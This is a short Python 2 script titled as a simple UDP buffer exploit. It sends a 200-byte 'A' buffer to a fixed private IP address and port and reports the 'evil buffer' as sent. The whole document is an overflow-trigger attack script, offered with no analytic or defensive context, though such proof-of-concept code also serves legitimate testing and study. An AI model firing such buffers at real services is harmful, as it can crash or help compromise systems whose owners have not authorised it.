## Simple 'udp' buffer exploit 

import socket
import sys

buf = 'A' * 200

try:
    sc = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #udp socket
    sc.connect(("192.168.1.103", 1979))
    sc.send(buf + "\n")
    print "[+] Evil buffer sent"
    sc.close()

except:
    print "[-] Can't send evil buffer"
    sys.exit()
